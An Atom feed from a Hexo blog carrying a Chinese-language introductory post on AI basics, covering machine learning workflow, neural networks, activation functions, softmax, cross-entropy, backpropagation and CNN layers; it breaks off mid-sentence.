<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="https://fa1lr4in.github.io/atom.xml" rel="self"/>
  
  <link href="https://fa1lr4in.github.io/"/>
  <updated>2022-06-16T06:42:10.997Z</updated>
  <id>https://fa1lr4in.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>AI基础</title>
    <link href="https://fa1lr4in.github.io/2022/06/16/AI%E5%9F%BA%E7%A1%80/"/>
    <id>https://fa1lr4in.github.io/2022/06/16/AI%E5%9F%BA%E7%A1%80/</id>
    <published>2022-06-16T06:39:47.000Z</published>
    <updated>2022-06-16T06:42:10.997Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AI基础"><a href="#AI基础" class="headerlink" title="AI基础"></a>AI基础</h1><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>之前对人工智能与机器学习等仅限于听说过这个名词，再深入一点就不懂了，正好前段时间看了公司的内部的人工智能（AI）入门课程，入门了下人工智能的基础，感叹了下，人工智能确实更加方便解决了之前难以解决的问题，这里将所学所思以博客的方式记录下。</p><h2 id="二、概念"><a href="#二、概念" class="headerlink" title="二、概念"></a>二、概念</h2><h3 id="2-1-人工智能"><a href="#2-1-人工智能" class="headerlink" title="2.1 人工智能"></a>2.1 人工智能</h3><h4 id="2-1-1-人工智能概念"><a href="#2-1-1-人工智能概念" class="headerlink" title="2.1.1 人工智能概念"></a>2.1.1 人工智能概念</h4><p>人工智能顾名思义就是研究如何模拟、延申并扩展人类智能的一门计算机科学。传统计算机编程可以解决“确定性问题”（最短距离计算，偏微分方程求解…），但对于不确定性问题（手写文字识别，垃圾邮件识别，听声辨人…），难以解决；人工智能所做的就是处理这些难以解决的问题。</p><h4 id="2-1-2-研究人工智能的主要目的"><a href="#2-1-2-研究人工智能的主要目的" class="headerlink" title="2.1.2 研究人工智能的主要目的"></a>2.1.2 研究人工智能的主要目的</h4><p>促使计算机像人一样，</p><p>1）会听：语音识别</p><p>2）会看：图像、文字识别</p><p>3）会说：语音合成，人机对话</p><p>4）会思考：人机对弈，定理证明</p><p>5）会学习：知识表示</p><p>6）会行动：机器人，自动驾驶</p><h4 id="2-1-3-人工智能在现实生活中的应用"><a href="#2-1-3-人工智能在现实生活中的应用" class="headerlink" title="2.1.3 人工智能在现实生活中的应用"></a>2.1.3 人工智能在现实生活中的应用</h4><p>人工智能的常见应用：推荐算法（知乎，浏览器，电商等）；手写体识别（邮件地址，发票）；人脸识别（门禁）；医疗图像诊断与机器人手术； 电商虚拟客服；汽车无人驾驶与语音识别功能等。</p><p>安全中的应用：病毒文件检测；垃圾邮件检测；可疑域名检测；代码漏洞检测；异常行为检测……</p><h3 id="2-2-机器学习"><a href="#2-2-机器学习" class="headerlink" title="2.2 机器学习"></a>2.2 机器学习</h3><h4 id="2-2-1-机器学习概念"><a href="#2-2-1-机器学习概念" class="headerlink" title="2.2.1 机器学习概念"></a>2.2.1 机器学习概念</h4><p>通过已知数据、去学习数据中的规律与特征。并推广应用的未来新的数据上并做出判断或者预测。</p><h4 id="2-2-2-机器学习基本流程"><a href="#2-2-2-机器学习基本流程" class="headerlink" title="2.2.2 机器学习基本流程"></a>2.2.2 机器学习基本流程</h4><p><strong>1）数据获取</strong>：自己采集；公开的数据集；(数据要具有代表性，广泛性)</p><p><strong>2）数据预处理：</strong>归一化，离散化，去除共线性；(清洗数据，提高算法的效果)</p><p><strong>3）特征工程：</strong>筛选显著特征，摒弃无用特征，生成高密度待训练向量；(<strong>数据和特征工程</strong>决定了机器学习的<strong>结果上限</strong>，<strong>算法</strong>只是让模型尽可能<strong>逼近上限</strong>)</p><p><strong>4）机器学习(模型训练)：</strong>选模型；调参优化；(不同模型以及不同参数，在同一数据集效果预测差异显著)</p><p><strong>5）模型评估(效果预测)：</strong>过拟合,欠拟合；精准率(P)，召回率(F)，推理加速、压缩，优化；模型部署；(高性能的模型对于数据具有较好的泛化性以及精确性)</p><h4 id="2-2-3-机器学习算法分类"><a href="#2-2-3-机器学习算法分类" class="headerlink" title="2.2.3 机器学习算法分类"></a>2.2.3 机器学习算法分类</h4><p>按学习方式分类可分为</p><table><thead><tr><th align="left">学习方式</th><th align="left">英文</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">监督式学习</td><td align="left">Supervised Learning</td><td align="left">训练集目标:有标注; 如回归分析，统计分类。如房价预测与医学影像方面的应用，标签在学习过程中起到监督作用。</td></tr><tr><td align="left">非监督式学习</td><td align="left">Unsupervised Leanring</td><td align="left">训练集目标:无标注;如聚类、GAN(生成对抗网络)。如客户分类与购物行为分析等方面的应用（没有标签主要是因为数据太乱、标注成本高、区分难度大等）</td></tr><tr><td align="left">半监督式学习</td><td align="left">Semi-supervised Leanring</td><td align="left">介于监督式与无监督式之间。部分数据集包含标签，对小部分数据起到监督作用。（通过已知标签的小部分数据，使用所有数据样本）。如文本分类与基于GPS的车道线检测等。</td></tr><tr><td align="left">增强学习</td><td align="left">Reinforcement Leanring</td><td align="left">基于环境的反馈行动，通过不断与环境进行交互，通过试错的方式来获得最佳策略（收益最大化）。如优化营销与无人驾驶等。</td></tr></tbody></table><p>如果按照学习任务分类可分为</p><table><thead><tr><th align="left">学习任务</th><th align="left">英文</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">分类</td><td align="left">Classification</td><td align="left">分类是预测一个标签 （是离散的），属于监督学习</td></tr><tr><td align="left">回归</td><td align="left">Regression</td><td align="left">回归是预测一个数量 （是连续的），属于监督学习</td></tr><tr><td align="left">聚类</td><td align="left">Clustering</td><td align="left">属于无监督学习</td></tr></tbody></table><p>它们之间的关系如下</p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/1526871561920_2201.png" alt="1526871561920_2201"></p><h4 id="2-2-4-机器学习的使用场景"><a href="#2-2-4-机器学习的使用场景" class="headerlink" title="2.2.4 机器学习的使用场景"></a>2.2.4 机器学习的使用场景</h4><p>确定性高的一律用规则解决，也就是确定特征，这样保证判断的准确性。而当特征少时又不适合机器学习来解决，因为机器学习需要通过大量样本的训练提取特征，通过特征来做预测。所以机器学习适用于<strong>确定性低以及特征多</strong>的场景。</p><p> 总的来说，机器学习适用于感知性的问题场景，而不适用于准确性的逻辑场景；适用于最优解获取复杂的问题场景，不适用于最优解获取简单的问题场景。</p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/image-20220610153119077.png" alt="image-20220610153119077"></p><h3 id="2-3-神经网络"><a href="#2-3-神经网络" class="headerlink" title="2.3 神经网络"></a>2.3 神经网络</h3><h4 id="2-3-1-神经网路的起源"><a href="#2-3-1-神经网路的起源" class="headerlink" title="2.3.1 神经网路的起源"></a>2.3.1 神经网路的起源</h4><p>介绍深度学习之前先了解下神经网络，深度学习是神经网络的一种组织形式。 神经网络来源于仿生学。人们希望机器能够像人一样会听、会算、会思考等等，那么，能否在计算机中，构造出一个人脑，成为了一个自然的想法。</p><p><strong>起源：</strong>1981 年的诺贝尔医学奖，证明“可视皮层是分级的”</p><p><strong>经过：</strong>在猫的后脑头骨上，开了一个3 毫米的小洞，向洞里插入电极，测量神经元的活跃程度；然后，他们在小猫的眼前，展现各种形状、各种亮度的物体。并且，在展现每一件物体时，还改变物体放置的位置和角度。经历了很多天反复的枯燥的试验，同时牺牲了若干只可怜的小猫，David Hubel 和Torsten Wiesel 发现了一种被称为“方向选择性细胞（Orientation Selective Cell）”的神经元细胞。当瞳孔发现了眼前的物体的边缘，而且这个边缘指向某个方向时，这种神经元细胞就会活跃。</p><p><strong>结论：</strong>从<strong>原始信号</strong>摄入开始（瞳孔摄入像素 Pixels），接着做<strong>初步处理</strong>（大脑皮层某些细胞发现边缘和方向），<strong>然后抽象</strong>（大脑判定，眼前的物体的形状，是圆形的），<strong>然后进一步抽象，直至给出对物体****的判断</strong>（大脑进一步判定该物体是只气球）。</p><h4 id="2-3-2-神经网络简单介绍"><a href="#2-3-2-神经网络简单介绍" class="headerlink" title="2.3.2 神经网络简单介绍"></a>2.3.2 神经网络简单介绍</h4><p>参考<a class="link"   href="https://zhuanlan.zhihu.com/p/65472471" >神经网络15分钟入门！足够通俗易懂了吧<i class="fas fa-external-link-alt"></i></a>。</p><p>总结：神经网络的训练依靠反向传播算法：最开始输入层输入特征向量，网络层层计算获得输出，输出层发现输出和正确的类号不一样，这时它就让最后一层神经元进行参数调整，最后一层神经元不仅自己调整参数，还会勒令连接它的倒数第二层神经元调整，层层往回退着调整。经过调整的网络会在样本上继续测试，如果输出还是老分错，继续来一轮回退调整，直到网络输出满意为止。</p><p>BP神经网络里面的一些数学推导可以参考<a class="link"   href="https://www.bilibili.com/video/BV1M7411M7D2/" >1.2 卷积神经网络基础补充<i class="fas fa-external-link-alt"></i></a>，up主讲得比较清晰明了，他的其他视频也是值得学习的。</p><h5 id="2-3-2-1-简化的两层神经网路分析"><a href="#2-3-2-1-简化的两层神经网路分析" class="headerlink" title="2.3.2.1 简化的两层神经网路分析"></a>2.3.2.1 简化的两层神经网路分析</h5><p>下面是两层神经网络的一种典型结构</p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/v2-7ee8cabcbd707dd4deab7155af2ba4cd_720w.jpg" alt="v2-7ee8cabcbd707dd4deab7155af2ba4cd_720w"></p><p>这里模拟了输入一个坐标，输出该坐标所在的象限（如（1，1）在第一象限），此时输入层代表我们的输入，也就是坐标（xy两个输入代表横纵坐标）；输出层代表该坐标所在的象限（一共四个象限）。（其实这个例子并不是很合适，该例子完成可以通过确定判断来完成，忽略这个更优解法，从而得理解机器学习的概念也不失为一个优秀的思路，因为这个例子够简单）。</p><p>这里从输入层到隐藏层可以看作一个矩阵运算</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H = X*W1+b1</span><br></pre></td></tr></table></figure><p>而从隐藏层到输出层，同样是通过矩阵运算进行的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Y = H*W2+b2</span><br></pre></td></tr></table></figure><p>通过上述两个线性方程的计算，我们就能得到最终的输出Y了，但是如果你还对线性代数的计算有印象的话，应该会知道：***一系列线性方程的运算最终都可以用一个线性方程表示***。也就是说，上述两个式子联立后可以用一个线性方程表达。对于两次神经网络是这样，就算网络深度加到100层，也依然是这样。这样的话整个过程就是线性的了（最终过程得到了一个线性方程），神经网络就失去了意义。</p><p>所以这里要对网络注入灵魂：<strong>激活层</strong>，激活层的作用就是为矩阵运算添加非线性结果。</p><h5 id="2-3-2-2-激活函数"><a href="#2-3-2-2-激活函数" class="headerlink" title="2.3.2.2 激活函数"></a>2.3.2.2 激活函数</h5><p>首先上一张图感受一下</p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/342ac65c103853437e226c5f47129b77cb8088ee.png" alt="342ac65c103853437e226c5f47129b77cb8088ee"></p><p>上面也提到了。激活函数为的作用主要是为矩阵运算添加非线性结果，常见的激活函数有三种，分别是阶跃函数、Sigmoid和ReLU。不要被奇怪的函数名吓到，其实它们的形式都很简单，如下图</p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/v2-5600c3448f3cb260702e7460cfb0be31_720w.jpg" alt="v2-5600c3448f3cb260702e7460cfb0be31_720w"></p><p>阶跃函数：当输入小于等于0时，输出0；当输入大于0时，输出1。</p><p>Sigmoid：当输入趋近于正无穷/负无穷时，输出无限接近于1/0。</p><p>ReLU：当输入小于0时，输出0；当输入大于0时，输出等于输入。</p><p>其中，阶跃函数输出值是跳变的，且只有二值，较少使用；Sigmoid函数在当x的绝对值较大时，曲线的斜率变化很小（梯度消失），并且计算较复杂；ReLU是当前较为常用的激活函数。</p><p>假如经过公式<strong>H=X*W1+b1</strong>计算得到的H值为：(1,-2,3,-4,7…)，那么经过阶跃函数激活层后就会变为(1,0,1,0,1…)，经过ReLU激活层之后会变为(1,0,3,0,7…)。需要注意的是，每个隐藏层计算（矩阵线性运算）之后，都需要加一层激活层，要不然该层线性计算是没有意义的。此时的神经网络变成了下图的形式。（需要注意的一点是，输入与w1可能有些点会被丢弃，这种做法同样参照仿生学，当我们的大脑同时接收到大量的信息时也会将消息分类为有用和无用的信息。这对机器学习很重要，因为不是所有的信息都是同样有用的，有些信息只是噪音。这就是激活函数的作用，激活函数帮助网络使用重要的信息，抑制不相关的数据点。）</p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/v2-0ced86f32dfa241fc9de10421edbd9b4_720w.jpg" alt="v2-0ced86f32dfa241fc9de10421edbd9b4_720w"></p><p>此时的输出层可能得到结果如(3,1,0.1,0.5)这样的矩阵，我们解读得到的数据，找到里面的3，得知大概率是在第一象限，但是这样做不够优雅，当然也可以对结果做简单的大小比较从而实现输出优化，但在人工智能领域，可以通过添加<strong>“Softmax”</strong>层达到输出“美化”的目的。得到了其对应的概率如(90%,5%,2%,3%)，这样做不仅可以找到最大概率的分类，而且可以知道各个分类计算的概率值。具体计算公式为</p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/v2-3ad93ae576918ff385485dab6a2e6b87_720w.png" alt="v2-3ad93ae576918ff385485dab6a2e6b87_720w"></p><p>简单来说分三步进行：（1）以e为底对所有元素求指数幂；（2）将所有指数幂求和；（3）分别将这些指数幂与该和做商。</p><p>这样求出的结果中，所有元素的和一定为1，而每个元素可以代表概率值。此时的神经网络将变成如下图所示：</p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/v2-01285f87ff9d523f62d2d4f6586583c5_720w.jpg" alt="v2-01285f87ff9d523f62d2d4f6586583c5_720w"></p><h5 id="2-3-2-3-衡量输出的好坏（损失函数与评价指标）"><a href="#2-3-2-3-衡量输出的好坏（损失函数与评价指标）" class="headerlink" title="2.3.2.3 衡量输出的好坏（损失函数与评价指标）"></a>2.3.2.3 衡量输出的好坏（损失函数与评价指标）</h5><p>通过Softmax层之后，我们得到了一个点处在四个象限的概率，但是要注意，这是神经网络计算得到的概率值结果，而非真实的情况。比如，Softmax输出的结果是(90%,5%,3%,2%)，真实的结果是(100%,0,0,0)。虽然输出的结果可以正确分类，但是与真实结果之间是有差距的，一个优秀的网络对结果的预测要无限接近于100%，为此，我们需要将Softmax输出结果的好坏程度做一个“量化”。</p><p>一种直观的解决方法，是用1减去Softmax输出的概率，比如1-90%=0.1。不过更为常用且巧妙的方法是，求<strong>对数的负数</strong>。还是用90%举例，对数的负数就是：-log0.9=0.046。而求负数对数的过程也可以理解其为一个损失函数。而概率越接近100%，该计算结果值越接近于0，说明结果越准确，该输出叫做“<strong>交叉熵损失</strong>（Cross Entropy Error）”。我们训练神经网络的目的，就是尽可能地减少这个“交叉熵损失”。</p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/v2-55f56e273500c8881440877d9c43ebba_720w.jpg" alt="v2-55f56e273500c8881440877d9c43ebba_720w"></p><p>然而考虑这样一种情况，如果最后的分类有人和男人，而男人是在人这个分类中的，最后所得的概率相加可能就不为1了，我们将这类问题称之为二分类问题，我们所用的输出优化函数常用的是sigmoid。而前面所举例的四个象限的问题称之为多分类问问题。</p><ol><li>针对多分类问题（softmax输出，所有输出概率和为1）</li><li>针对二分类问题（sigmoid输出，每个输出节点之间互不相干）</li></ol><h5 id="2-3-2-4-反向传播与参数优化"><a href="#2-3-2-4-反向传播与参数优化" class="headerlink" title="2.3.2.4 反向传播与参数优化"></a>2.3.2.4 反向传播与参数优化</h5><p>上面的过程可以通过一句话总结：<strong>神经网络的传播都是形如Y=WX+b的矩阵运算；为了给矩阵运算加入非线性，需要在隐藏层中加入激活层；输出层结果需要经过Softmax层处理为概率值，并通过交叉熵损失来量化当前网络的优劣。</strong></p><p>算出交叉熵损失后，就要开始反向传播了。其实反向传播就是一个<strong>参数优化</strong>的过程，优化对象就是网络中的所有W和b（因为其他所有参数都是确定的）。神经网络的神奇之处，就在于它可以自动做W和b的优化，在深度学习中，参数的数量有时会上亿，不过其优化的原理和我们这个两层神经网络是一样的。</p><p>举一个形象的例子，我们现在要靠饮食打造一个完美健康的身体。我们不断的调整糖类，脂肪，蛋白质及其他营养元素来实现我们的目的，这里的糖类，脂肪，蛋白质与其他营养元素就是上面提到的w1,b1,w2,b2。当我们摄入一次后，假设有个仪器可以查看我们的身体状态，发现这样的摄入比例并不能完美的使我们的身体变得更好，那么会将这次的结果向前传递，从而指导营养结构的优化，这就是梯度下降法。</p><p>反向传播可以帮助参数优化，从而使结果的概率更加接近百分之百。</p><h5 id="2-3-2-5-迭代"><a href="#2-3-2-5-迭代" class="headerlink" title="2.3.2.5 迭代"></a>2.3.2.5 迭代</h5><p>神经网络需要反复迭代。如上述例子中，第一次计算得到的概率是90%，交叉熵损失值是0.046；将该损失值反向传播，使W1,b1,W2,b2做相应微调；再做第二次运算，此时的概率可能就会提高到92%，相应地，损失值也会下降，然后再反向传播损失值，微调参数W1,b1,W2,b2。依次类推，损失值越来越小，直到我们满意为止。</p><h4 id="2-3-3-卷积神经网络"><a href="#2-3-3-卷积神经网络" class="headerlink" title="2.3.3 卷积神经网络"></a>2.3.3 卷积神经网络</h4><p>参考自<a class="link"   href="https://zhuanlan.zhihu.com/p/32472241" >零基础理解卷积神经网络<i class="fas fa-external-link-alt"></i></a> 与<a class="link"   href="https://zhuanlan.zhihu.com/p/227774699" >从零开始实现卷积神经网络CNN<i class="fas fa-external-link-alt"></i></a>及<a class="link"   href="https://blog.csdn.net/Chen_Swan/article/details/105486854" >池化层详细介绍<i class="fas fa-external-link-alt"></i></a>还有<a class="link"   href="https://zhuanlan.zhihu.com/p/77040467" >深度学习入门之池化层<i class="fas fa-external-link-alt"></i></a>。</p><p>CNN（Convolutional Neural Network）。只要包含了卷积层的网络就被成为卷积神经网络</p><p>CNN的灵感的确来自大脑中的视觉皮层。视觉皮层某些区域中的神经元只对特定视野区域敏感。1962年，在一个Hubel与Wiesel进行的试验（<a class="link"   href="https://www.youtube.com/watch?v=Cw5PKV9Rj3o" >视频<i class="fas fa-external-link-alt"></i></a>）中，这一想法被证实并且拓展了。他们发现，一些独立的神经元只有在特定方向的边界在视野中出现时才会兴奋。比如，一些神经元在水平边出现时兴奋，而另一些只有垂直边出现时才会。并且所有这种类型的神经元都在一个柱状组织中，并且被认为有能力产生视觉。</p><p>卷积神经网络的学习过程借鉴了人类视觉系统的工作原理，当前已经被广泛应用于各个领域，主要包括人脸识别、车牌识别、物体识别、视频分析等涉及图像处理的场景，当然在自然语言处理等非图像处理领域也有应用。全连接深度神经网络（DNN）也可以用于图像处理任务，但是这类任务通常首选CNN，原因主要有两个：</p><p>一是图片很大，假设一张224x224组成的黑白图片，输入神经网络的特征维度为50176，假设神经网络只有一个隐藏层，其神经元个数为1024，那么就这么个简单的神经网络需要学习的参数就达到了51380224，超过千万，如果是3通道的彩色图片，则神经网络需要学习的参数量轻松过亿，这么庞大的参数量如果没有足够多的图片和计算资源的话，几乎很难训练。关键的是，在一张图片中并不是每一个像素都有用，通常能起到关键区分作用的是一些边角等局部特征，所以实际上我们并不需要这么多参数去拟合每一个像素。卷积神经网络能够自动从图片中提取到一些起区分作用的特征，在这之前，这些特征通常需要使用别的算法手动提取出来，然后再输入到支持向量机（SVM，Support Vector Machine）等分类模型中去。</p><p>二是待识别图片里面物体的位置会变化。假设我们需要判断一张宠物图片是猫还是狗，不管这只宠物位于图片的什么位置，从什么角度拍的，全身照还是大头照，模型要都能够准确识别出来它是猫还是狗，但是传统的神经网络没法适应这种变化，因为模型的每一个参数几乎与图片里面每一个像素位置联系了起来，图片内容一旦发生扭曲或者变形，都会导致模型输出变化很大。而卷积神经网络能够应对这种问题，因为它有参数共享架构及平移不变特性，因此CNN又被称为位移不变或者空间不变人工神经网络（SIANN，Shift Invariant Artificial Neural Networks）。</p><h5 id="2-3-3-1-神经网络结构"><a href="#2-3-3-1-神经网络结构" class="headerlink" title="2.3.3.1 神经网络结构"></a>2.3.3.1 神经网络结构</h5><p>CNN的工作流程是这样的：你把一张图片传递给模型，经过一些卷积层，非线性化（激活函数），池化，以及全连层，最后得到结果。就像我们之前所说的那样，输出可以是单独的一个类型，也可以是一组属于不同类型的概率。现在我们理解下各个层的作用。</p><h5 id="2-3-3-2-卷积层-数学描述"><a href="#2-3-3-2-卷积层-数学描述" class="headerlink" title="2.3.3.2 卷积层-数学描述"></a>2.3.3.2 卷积层-数学描述</h5><p>假设我们将一个32x32x3的记录像素值的数组作为输入传入卷积层，想象卷积层中有一个手电筒照在了输入的左上角，且手电筒的光可以照到一个5 × 5的区域。现在，让我们想象这个手电筒照过了图片的所有区域。在机器学习术语中，这样一个手电筒被称为卷积核（或者说过滤器，神经元）(kernel, filter, neuron)。而它照到的区域被称为感知域(receptive field)。卷积核同样也是一个数组（其中的数被称为权重或者参数）。很重要的一点就是卷积核的深度和输入图像的深度是一样的（这保证可它能正常工作），所以这里卷积核的大小是5 × 5 × 3。</p><p>现在，让我们拿卷积核的初始位置作为例子，它应该在图像的左上角。当卷积核扫描它的感知域（也就是这张图左上角5 × 5 × 3的区域）的时候，它会将自己保存的权重与图像中的像素值相乘（或者说，矩阵元素各自相乘，注意与矩阵乘法区分），所得的积会相加在一起（在这个位置，卷积核会得到5 × 5 × 3 = 75个积）。现在你得到了一个数字。然而，这个数字只表示了卷积核在图像左上角的情况。现在，我们重复这一过程，让卷积核扫描完整张图片，（下一步应该往右移动一格，再下一步就再往右一格，以此类推），每一个不同的位置都产生了一个数字。当扫描完整张图片以后，你会得到一组新的28 × 28 × 1的数。（(32 - 5 + 1) × (32 - 5 + 1) × 1）。这组数，我们称为激活图或者特征图(activation map or feature map)。</p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/v2-69bbda16806f99f02f138048c160b2ba_720w.jpg" alt="v2-69bbda16806f99f02f138048c160b2ba_720w"></p><p>如果增加卷积核的数目，比如，我们现在有两个卷积核，那么我们就会得到一个28 × 28 × 2的数组。通过使用更多的卷积核，我们可以更好的保留数据的空间尺寸。</p><p>在数学层面上说，这就是卷积层所做的事情。</p><h5 id="2-3-3-3-卷积层-更高角度"><a href="#2-3-3-3-卷积层-更高角度" class="headerlink" title="2.3.3.3 卷积层-更高角度"></a>2.3.3.3 卷积层-更高角度</h5><p>我们先了解一个概念：上面用卷积核与每个感知域重合会的得到一个数字，他们用来描述相似程度，数字越大，相似程度越高。也就是说，每一个卷积核都可以被看作特征识别器。现在我们尝试解释一下这个概念。</p><p>每一个卷积核都可以被看做特征识别器。我所说的特征，是指直线、简单的颜色、曲线之类的东西。这些都是所有图片共有的特点。拿一个7 × 7 × 3的卷积核作为例子，它的作用是识别一种曲线。（在这一章节，简单起见，我们忽略卷积核的深度，只考虑第一层的情况）。作为一个曲线识别器，这个卷积核的结构中，曲线区域内的数字更大。（记住，卷积核是一个数组）</p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/v2-72360d0b12c1d67d50ecc373a92bee44_720w.png" alt="v2-72360d0b12c1d67d50ecc373a92bee44_720w"></p><p>现在我们来直观的看看这个。举个例子，假设我们要把这张图片分类。让我们把我们手头的这个卷积核放在图片的左上角。</p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/v2-e329ce17f47f3c616d071fdd093694b9_720w.png" alt="v2-e329ce17f47f3c616d071fdd093694b9_720w"></p><p>我们要做的事情是把卷积核中的权重和输入图片中的像素值相乘。（计算方式就是上面提到过的每个相同位置的数字相乘再相加）</p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/v2-88277f98dce3041bff09c1a1cd88306a_720w.png" alt="v2-88277f98dce3041bff09c1a1cd88306a_720w"></p><p>基本上，如果输入图像中有与卷积核代表的形状很相似的图形，那么所有乘积的和会很大。现在我们来看看，如果我们移动了卷积核呢？</p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/v2-e9d34590783f23767112ddbc293353e0_720w.png" alt="v2-e9d34590783f23767112ddbc293353e0_720w"></p><p>可以看到，得到的值小多了！这是因为感知域中没有与卷积核表示的相一致的形状。还记得吗，卷积层的输出是一张激活图。所以，在单卷积核卷积的简单情况下，假设卷积核是一个曲线识别器，那么所得的激活图会显示出哪些地方最有可能有曲线。在这个例子中，我们所得激活图的左上角的值为6600。这样大的数字表明很有可能这片区域中有一些曲线，从而导致了卷积核的激活（也就是产生了很大的数值。）而激活图中右上角的数值是0，因为那里没有曲线来让卷积核激活（简单来说就是输入图像的那片区域没有曲线）。</p><p>但请记住，这只是一个卷积核的情况，只有一个找出向右弯曲的曲线的卷积核。我们可以添加其他卷积核，比如识别向左弯曲的曲线的。卷积核越多，激活图的深度就越深，我们得到的关于输入图像的信息就越多。</p><blockquote><p>在文中提到的卷积核的主要目的是说明，是经过简化的。在下图中你会看到真正的经过训练后的神经网络中第一层卷积层中卷积核可视化后的样子。不管怎样，道理还是一样的。第一层的卷积核扫描整张网络，并在识别到相应特征时激活。</p></blockquote><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/v2-fc38dc8273cb0ccb0068a5a527d74039_720w.jpg" alt="v2-fc38dc8273cb0ccb0068a5a527d74039_720w"></p><p>在传统的CNN结构中，还会有其他层穿插在卷积层之间。但总的来说，他们提供了非线性化，保留了数据的维度，有助于提升网络的稳定度并且抑制过拟合。一个经典的CNN结构是这样的：</p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/v2-24a86448bce734cc5f6cc97a264644b4_720w.png" alt="v2-24a86448bce734cc5f6cc97a264644b4_720w"></p><p>我们讲到了第一层卷积层的卷积核的目的是识别特征，他们识别像曲线和边这样的低层次特征。但可以想象，如果想预测一个图片的类别，必须让网络有能力识别高层次的特征，例如手、爪子或者耳朵。让我们想想网络第一层的输出是什么。假设我们有5个5 × 5 × 3的卷积核，输入图像是32 × 32 × 3的，那么我们会得到一个28 × 28 × 5的数组。来到第二层卷积层，第一层的输出便成了第二层的输入。这有些难以可视化。第一层的输入是原始图片，可第二层的输入只是第一层产生的激活图，激活图的每一层都表示了低层次特征的出现位置。如果用一些卷积核处理它，得到的会是表示高层次特征出现的激活图。这些特征的类型可能是半圆（曲线和边的组合）或者矩形（四条边的组合）。随着卷积层的增多，到最后，你可能会得到可以识别手写字迹、粉色物体等等的卷积核。</p><p>具体的卷积核可视化的信息，这个<a class="link"   href="https://www.youtube.com/watch?v=AgkfIQ4IGaM" >视频<i class="fas fa-external-link-alt"></i></a>。</p><p>还有一件事情很有趣，当网络越来越深，卷积核会有越来越大的相对于输入图像的感知域。这意味着他们有能力考虑来自输入图像的更大范围的信息（或者说，他们对一片更大的像素区域负责）。</p><h5 id="2-3-3-4-池化层"><a href="#2-3-3-4-池化层" class="headerlink" title="2.3.3.4 池化层"></a>2.3.3.4 池化层</h5><h6 id="2-3-3-4-1-简单介绍"><a href="#2-3-3-4-1-简单介绍" class="headerlink" title="2.3.3.4.1 简单介绍"></a>2.3.3.4.1 简单介绍</h6><p>它实际上是一种形式的降采样。有多种不同形式的非线性池化函数，而其中“最大池化（Max pooling）”是最为常见的。它是将输入的图像划分为若干个矩形区域，对每个子区域输出最大值。直觉上，这种机制能够有效地原因在于，在发现一个特征之后，它的精确位置远不及它和其他特征的相对位置的关系重要。池化层会不断地减小数据的空间大小，因此参数的数量和计算量也会下降，这在一定程度上也控制了过拟合。通常来说，CNN的卷积层之间都会周期性地插入池化层。</p><p><img src="/2022/06/16/AI%E5%9F%BA%E7%A1%80/image-20220614113833041.png" alt="image-20220614113833041"></p><h6 id="2-3-3-4-2-池化的作用"><a href="#2-3-3-4-2-池化的作用" class="headerlink" title="2.3.3.4.2 池化的作用"></a>2.3.3.4.2 池化的作用</h6><p>池化操作后的结果相比其输入缩小了。池化层的引入是仿照人的视觉系统对视觉输入对象进行降维和抽象。在卷积神经网络过去的工作中，研究者普遍认为池化层有如下三个功效：</p><p>　1.特征不变性：池化操作是模型更加关注是否存在某些特征而不是特征具体的位置。其中不变形性包括，平移不变性、旋转不变性和尺度不变性。</p><p>平移不变性是指输出结果对输入对小量平移基本保持不变，例如，输入为(1, 5, 3), 最大池化将会取5，如果将输入右移一位得到(0, 1, 5)，输出的结果仍将为5。对伸缩的不变形，如果原先的神经元在最大池化操作后输出5，那么经过伸缩（尺度变换）后，最大池化操作在该神经元上很大概率的输出仍是5.</p><p>　　2.特征降维（下采样）：池化相当于在空间范围内做了维度约减，从而使模型可以抽取更加广范围的特征。同时减小了下一层的输入大小，进而减少计算量和参数个数。</p><p>　　3.在一定程度上防止过拟合，更方便优化。</p><ul><li>池化层的常见操作包含以下几种：最大值池化，均值池化，随机池化，中值池化，组合池化等。这些池化操作的优劣可以参考<a class="link"   href="https://zhuanlan.zhihu.com/p/77040467" >深度学习入门之池化层<i class="fas fa-external-link-alt"></i></a>，这里就不详细展开了。</li></ul><h5 id="2-3-3-5-全连层"><a href="#2-3-3-5-全连层" class="headerlink" title="2.3.3.5 全连层"></a>2.3.3.5 全连层</h5><p>到目前为止，我们已经识别出了那些高层次的特征。而卷积神经网络最后的画龙点睛之笔是全连层。</p><p>简单地说，这一层接受输入（来自卷积层，池化层或者激活函数都可以），并输出一个N维向量，其中，N是所有有可能的类别的总数。例如，如果你想写一个识别数字的程序，那么N就是10，因为总共有10个数字。N维向量中的每一个数字都代表了属于某个类别的概率。打个比方，如果你得到了[0 0.1 0.1 0.75 0 0 0 0 0 